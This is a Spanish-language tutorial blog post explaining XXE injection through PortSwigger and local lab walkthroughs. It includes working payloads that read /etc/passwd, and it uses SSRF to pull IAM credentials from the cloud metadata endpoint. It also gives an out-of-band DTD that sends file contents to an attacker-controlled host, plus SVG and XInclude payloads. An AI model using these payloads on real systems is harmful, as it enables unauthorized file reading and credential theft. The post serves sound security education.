---
title: üõ∞Ô∏è XXE
categories: [Vulnerabilidades]
image: "/assets/img/xxe.png"
description: "XML External Entity Injection attack"
---

# üõ∞Ô∏è**XML External Entity Injection**

Explicaci√≥n acerca de XML External Entity (XXE) Injection

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/img/xxe.png" width="300"/>
  <p style="font-style: italic; margin-top: 8px;">Copyright ¬© 2010-2025 Freepik Company S.L.</p>
</div>

# üß®**¬øQu√© es XXE?**

Las inyecciones **XXE (XML External Entity)** ocurren cuando un servidor no realiza una correcta sanitizaci√≥n o validaci√≥n al procesar entradas en formato XML. Esta vulnerabilidad permite a un atacante aprovecharse del uso de entidades externas definidas dentro del XML para inyectar comandos maliciosos, lo que puede derivar en el acceso no autorizado a archivos del sistema, ejecuci√≥n de c√≥digo, denegaci√≥n de servicio, entre otros impactos.

Antes de profundizar en la vulnerabilidad XXE, es importante comprender qu√© es **XML (Extensible Markup Language)**.

XML es un formato de texto estructurado dise√±ado para almacenar y transportar datos de manera legible tanto para humanos como para m√°quinas. Aunque su sintaxis es similar a la de HTML, su prop√≥sito principal no es mostrar contenido en una p√°gina web, sino organizarlo y estructurarlo de forma l√≥gica y jer√°rquica para facilitar su interpretaci√≥n por diferentes sistemas y aplicaciones.
```xml
<usuario>
  <nombre>Ejemplo</nombre>
  <email>ejemplo@example.com</email>
</usuario>
```

Otro hom√≥logo que cumple una funci√≥n similar a XML es **JSON (JavaScript Object Notation)**. JSON tambi√©n est√° dise√±ado para estructurar y transportar datos entre sistemas, y su principal objetivo es facilitar la interpretaci√≥n de dicha informaci√≥n de manera clara y eficiente.

A diferencia de XML, JSON tiene una sintaxis m√°s ligera y sencilla, lo que lo convierte en una opci√≥n muy popular, especialmente en aplicaciones web modernas. Su estructura basada en pares clave-valor permite una representaci√≥n m√°s concisa de los datos, favoreciendo su uso en entornos donde el rendimiento y la legibilidad son prioritarios.

---

# üîß**¬øC√≥mo funciona?**

## üì¶**Entidades**

La funcionalidad que permite, desde el punto de vista del atacante, explotar vulnerabilidades de tipo XXE son las **entidades**.

En XML, una **entidad** es un mecanismo que permite definir un contenido reutilizable dentro del documento. Puede entenderse como una especie de "variable" que se puede invocar en distintas partes del XML, facilitando as√≠ la reutilizaci√≥n y organizaci√≥n del contenido.

Existen varios tipos de entidades, entre las cuales se destacan:

- **Entidades predefinidas**
- **Entidades internas personalizadas**
- **Entidades externas**

El mal uso o la falta de validaci√≥n de estas entidades, especialmente las externas, es lo que da lugar a las vulnerabilidades XXE.

### üî§**Entidades predefinidas**

Las **entidades predefinidas** son caracteres especiales que no pueden utilizarse directamente en un documento XML, ya que formar√≠an conflicto con la sintaxis del propio lenguaje. Para evitar errores de interpretaci√≥n, estos caracteres se representan mediante entidades espec√≠ficas.

| Entidad   | Significado |
|-----------|-------------|
| `&lt;`   | <           |
| `&gt;`   | >           |
| `&amp;`  | &           |
| `&quot;` | "           |
| `&apos;` | '           |

Estas entidades aseguran que el contenido se procese correctamente sin interferir con la estructura del documento XML.

### üìù**Entidades internas personalizadas**

Las **entidades internas personalizadas** permiten al autor del documento XML definir sus propias referencias a datos, que pueden ser reutilizadas en distintas partes del documento.

Se definen mediante la siguiente estructura:
```bash
<!ENTITY nombre "Ejemplo">
```

Este tipo de entidad se suele declarar dentro de una secci√≥n DOCTYPE, y su uso en un documento XML completo se ver√≠a as√≠:

```bash
<!DOCTYPE datos [
  <!ENTITY nombre "Ejemplo">
]>
<mensaje>&nombre;</mensaje>
```

En este ejemplo, donde se encuentra **`&nombre;`**, el procesador XML reemplazar√° dicha referencia por el valor **`"Ejemplo"`**. Este mecanismo facilita la reutilizaci√≥n de contenido dentro del documento y es una caracter√≠stica central de c√≥mo XML maneja datos estructurados.

Las **entidades externas** son el tercer tipo de entidad en XML y constituyen el principal vector de ataque en las inyecciones XXE. A diferencia de las entidades internas, estas pueden referenciar recursos externos al documento, como archivos locales del sistema o URLs remotas.

Un ejemplo de una entidad externa ser√≠a:

```bash
<!DOCTYPE datos [
  <!ENTITY archivo SYSTEM "file:///etc/passwd">
]>
<contenido>&archivo;</contenido>
```

En este caso, la palabra clave **`SYSTEM`** indica que se est√° declarando una entidad externa, y el valor entre comillas representa la ubicaci√≥n del recurso externo. En el ejemplo anterior, se intenta acceder al archivo sensible /etc/passwd de un sistema Unix.

Si el servidor que procesa este XML no cuenta con las medidas de seguridad adecuadas, puede terminar leyendo e incluyendo el contenido del archivo especificado, lo cual puede comprometer seriamente la seguridad del sistema.

---

## üß©**DTD - Document Type Definition**

El **DTD (Document Type Definition)** es una parte fundamental de un documento XML que define su estructura y las reglas que deben seguirse. Especifica qu√© elementos pueden utilizarse, qu√© atributos pueden tener dichos elementos, y tambi√©n permite la definici√≥n de entidades, tanto internas como externas.

En el contexto de las inyecciones XXE, el uso del DTD es imprescindible, ya que las entidades deben declararse dentro de √©l. Sin la inclusi√≥n de un DTD en el documento XML, no ser√≠a posible declarar ni utilizar entidades personalizadas o externas.

El DTD puede integrarse de dos maneras:

- **Internamente**, dentro del propio archivo XML.
- **Externamente**, mediante una referencia a un archivo DTD separado.

La estructura b√°sica de un DTD interno es la siguiente:

```bash
<!DOCTYPE foo [
  <!ELEMENT ...>
  <!ATTLIST ...>
  <!ENTITY ...>
]>
```

---

# üíâ**Tipos de XXE injection**

Existen distintos tipos de ataques basados en inyecciones **XXE**, cada uno con objetivos y mecanismos distintos. A continuaci√≥n, se listan los m√°s relevantes:

- [**XXE File Disclosure**](#xxe-file-disclosure): Permite acceder al contenido de archivos locales en el sistema donde se ejecuta el procesador XML.
- [**SSRF via XXE**](#ssrf-via-xxe): Utiliza la vulnerabilidad para enviar peticiones a recursos internos de la red mediante la inclusi√≥n de URLs externas en entidades.
- [**XXE Out-Of-Band (OOB)**](#xxe-out-of-band-oob): Exfiltra datos utilizando canales externos, como una URL bajo control del atacante, √∫til cuando no hay respuesta directa en la aplicaci√≥n.
- [**XXE via Image**](#xxe-via-image): Embebe una carga maliciosa en el contenido de una imagen para aprovechar sistemas que procesan im√°genes como XML.
- [**XXE via XInclude**](#xxe-via-xinclude): Variante del XXE que utiliza la caracter√≠stica XInclude de XML para incluir contenido externo en el documento procesado. Es un caso especial, pero tambi√©n explotable.

---

Para ilustrar de forma m√°s gr√°fica y pr√°ctica todo lo explicado, se resolver√°n los laboratorios de [PortSwigger](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection) enfocados en vulnerabilidades **XXE**, los cuales permiten explorar en profundidad cada tipo de ataque mencionado.


## üìÑ**XXE File Disclosure**

Para explicar esta categor√≠a de inyecci√≥n XXE, utilizaremos el laboratorio 1 de PortSwigger, que nos permite explorar diferentes enfoques para explotar esta vulnerabilidad. El caso m√°s sencillo ocurre cuando el servidor es vulnerable a inyecciones XXE y, adem√°s, interpreta y refleja el contenido del documento XML en la respuesta. En este laboratorio, el objetivo es leer el archivo **`/etc/passwd`** mediante la inyecci√≥n de una entidad externa en el DTD del XML. 

La petici√≥n inicial, que capturamos con Burp Suite, muestra c√≥mo se env√≠a el documento vulnerable para lograr la explotaci√≥n.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/lab1-1.png" width="1000"/>
</div>

Como se puede apreciar, existe un documento XML encargado de enviar la informaci√≥n necesaria para que el servidor la procese posteriormente.

A partir de esta base, procederemos a manipular el DTD con el fin de inyectar una entidad maliciosa que nos permita leer el contenido del fichero **`/etc/passwd`**.
```bash
<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///etc/passwd">]>
```

Para que el contenido del fichero aparezca reflejado en la respuesta del servidor, referenciarremos la entidad **`file`** en uno de los campos de datos del XML.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/lab1-2.png" width="1000"/>
</div>

Como se puede apreciar en la respuesta, obtenemos el contenido del fichero **`/etc/passwd`** en el lugar donde normalmente se recibir√≠a la respuesta nativa del servidor.

Sin embargo, este mismo vector de explotaci√≥n puede verse afectado por dos factores. El primero es que el servidor no permita la referencia a entidades dentro de sus campos de informaci√≥n, y el segundo es que el wrapper **`file://`** no funcione, lo que obligar√≠a a utilizar otro m√©todo para acceder al recurso deseado.

**Referencia a entidades dentro del DTD**

En el caso de que el servidor no permita referencias a entidades dentro de los campos XML, es posible insertar la referencia directamente en el **`DTD`** para que esta tambi√©n sea procesada. Esta t√©cnica se realiza de la siguiente manera:
```bash
<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> %file;]>
```

Si enviamos este nuevo **`DTD`** al servidor, obtendremos la misma respuesta, logrando as√≠ la lectura del contenido deseado.

**Diferentes tipos de wrappers**

Puede darse el caso de que el servidor sea vulnerable a inyecciones XXE, pero que el wrapper utilizado falle, por lo que sea necesario emplear otro. Los wrappers m√°s comunes son:

- **`file://`**  
- **`php://filter/convert.base64-encode/resource=`**  
- **`expect://`** (Este wrapper se utiliza para intentar ejecutar comandos en el servidor, aunque suele estar bloqueado por defecto)

Por ello, es fundamental probar diferentes wrappers en caso de que uno no funcione, para maximizar las posibilidades de explotaci√≥n.

## üåê**SSRF via XXE**

Las inyecciones XXE tambi√©n permiten realizar ataques de **SSRF (Server-Side Request Forgery)**. Para ilustrar este tipo de ataque, utilizaremos el laboratorio 2 de PortSwigger.

En este laboratorio, se nos indica que ataquemos la direcci√≥n IP **`http://169.254.169.254/`** con el fin de obtener informaci√≥n confidencial. Para lograrlo, insertaremos la siguiente entidad maliciosa dentro del DTD:
```bash
<!DOCTYPE foo [ <!ENTITY % file SYSTEM "http://169.254.169.254/"> %file;]>
```

Si enviamos la petici√≥n con ese DTD malicioso, obtenemos la siguiente respuesta:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/lab2-1.png" width="1000"/>
</div>

Como se puede apreciar, la respuesta indica que el **`ID: latest`** no existe. Esto nos se√±ala que el siguiente directorio bajo la IP a la que estamos atacando se llama **`latest`**.

Si modificamos la ruta a **`http://169.254.169.254/latest`** y enviamos la petici√≥n, obtenemos la siguiente respuesta:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/lab2-2.png" width="1000"/>
</div>

Siguiendo este proceso de forma iterativa, finalmente somos capaces de realizar una petici√≥n a **`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`** y obtener la informaci√≥n privada.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/lab2-3.png" width="1000"/>
</div>

## üîÑ**XXE Out-Of-Band (OOB)**

Puede darse el caso de que el servidor procese las entidades maliciosas, pero que la informaci√≥n extra√≠da no se refleje directamente en la respuesta del servidor. En estos escenarios, se recurre a las inyecciones **Out-Of-Band (OOB)** para exfiltrar datos mediante canales externos.

Por motivos de seguridad, PortSwigger restringe el acceso a los laboratorios relacionados con esta t√©cnica √∫nicamente a usuarios con la versi√≥n de pago de Burp Suite. Como alternativa, podemos montar un laboratorio local utilizando Docker, el cual se puede descargar en [GitHub](https://github.com/jbarone/xxelab).

Una vez configurado nuestro entorno local, nos encontraremos con un formulario que deberemos vulnerar para llevar a cabo el ataque.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/local-1.png" width="400"/>
</div>

Como se mencion√≥ anteriormente, este tipo de inyecciones se caracteriza porque no muestran ninguna informaci√≥n en el lado del servidor, por lo que ser√° necesario configurar un servidor propio para llevar a cabo la explotaci√≥n.

En primer lugar, para comprobar si es posible realizar peticiones desde la m√°quina v√≠ctima hacia nuestra m√°quina atacante, podemos poner nuestro equipo en escucha utilizando Python y enviar una petici√≥n HTTP mediante la siguiente entidad:
```bash
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.0.2.15:4000/"> %xxe;]>
```

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/local-3.png" width="1000"/>
</div>

Al analizar nuestro servidor en Python, podemos confirmar que s√≠ existe conexi√≥n con la m√°quina v√≠ctima.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/local-4.png" width="1000"/>
</div>

A ra√≠z de esto, podemos crear una entidad maliciosa alojada en nuestra m√°quina, provocar que la v√≠ctima realice una petici√≥n hacia dicha entidad y observar la respuesta en nuestro servidor. La entidad maliciosa tiene la siguiente estructura:
```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.2.15:4000/?file=%file;'>">
%eval;
%exfil;
```
### üìå Notas

- Es recomendable utilizar el wrapper **`php://filter/convert.base64-encode/resource=`**, ya que otros wrappers como **`file://`** pueden no funcionar en ciertos casos.  
- Dado que estamos almacenando en la entidad **`eval`** otra entidad completa, es aconsejable representar el s√≠mbolo **`%`** en formato hexadecimal (**`&#x25;`**) para evitar conflictos durante la interpretaci√≥n.  
- Se debe tener cuidado al referenciar las entidades, ya que la entidad **`exfil`** no existir√° hasta que la entidad **`eval`** haya sido referenciada previamente.

Una vez creado este fichero **`malicious`**, insertamos la siguiente entidad en el XML del servidor para que realice una petici√≥n a este recurso:
```bash
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.0.2.15:4000/malicious"> %xxe;]>
```

Por otro lado, en nuestro servidor podemos observar el siguiente patr√≥n:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/local-6.png" width="1000"/>
</div>

Se observa una primera solicitud al recurso **`malicious`** y una segunda entrada, esta vez con el fichero **`/etc/passwd`** de la v√≠ctima. Todo esto es posible gracias a las dos entidades creadas previamente.

Ahora solo queda copiar la cadena recibida y decodificarla de base64 a texto legible.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/local-7.png" width="1000"/>
</div>

De esta manera, hemos sido capaces de leer el fichero incluso cuando el servidor no nos lo devolv√≠a directamente en la respuesta.

## üñºÔ∏è**XXE via image**

Otra posible v√≠a para realizar una inyecci√≥n XXE es a trav√©s de un campo de subida de im√°genes que no cuente con una sanitizaci√≥n adecuada. Para ilustrar este caso, resolveremos el laboratorio 8 de PortSwigger y utilizaremos tambi√©n el repositorio [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) de GitHub.

En este escenario, nos enfrentamos al siguiente cuestionario:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/image.png" width="1000"/>
</div>

Podemos suponer que no se est√° validando correctamente si el archivo que se sube es realmente una imagen, por lo que es posible crear un archivo con extensi√≥n **`.svg`** que contenga un payload malicioso extra√≠do del repositorio de GitHub.
```bash
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
Cabe destacar que el payload debe estar contenido en una sola l√≠nea, ya que de lo contrario podr√≠a generar errores en ciertos casos.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/image-2.png" width="1000"/>
</div>

Si ahora rellenamos todos los campos correspondientes y enviamos el formulario, parecer√° que no ha ocurrido nada. Sin embargo, esto no es as√≠, ya que si abrimos la imagen subida en una nueva pesta√±a o la descargamos, observaremos algo extra√±o.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/image-3.png" width="1000"/>
</div>

Como se puede apreciar, el nombre mostrado es inusual, pero corresponde al nombre del host, ya que en este caso est√°bamos leyendo el archivo **`/etc/hostname`**.

## üîó**XXE via XInclude**

En este √∫ltimo tipo de inyecciones XXE, nos encontramos con un caso m√°s bien aleatorio, en el que no se aprecia ninguna estructura XML clara, pero a√∫n as√≠ es posible intentar insertar un payload malicioso. Nuevamente, utilizaremos el repositorio de GitHub [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) y emplearemos el siguiente payload:
```bash
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Una vez m√°s, utilizaremos un laboratorio de PortSwigger, donde en esta ocasi√≥n la petici√≥n tiene la siguiente estructura:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/xinclude.png" width="1000"/>
</div>
Como se puede observar, no se aprecia ning√∫n tipo de estructura XML ni elementos similares, pero podemos intentar aprovechar la vulnerabilidad. Para ello, utilizaremos el payload mencionado anteriormente e insertaremos su contenido en uno de los dos valores disponibles.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xxe/xinclude-1.png" width="1000"/>
</div>

Como se aprecia en la respuesta del servidor, la petici√≥n ha sido interpretada correctamente y hemos obtenido el fichero **`/etc/passwd`** que solicitamos.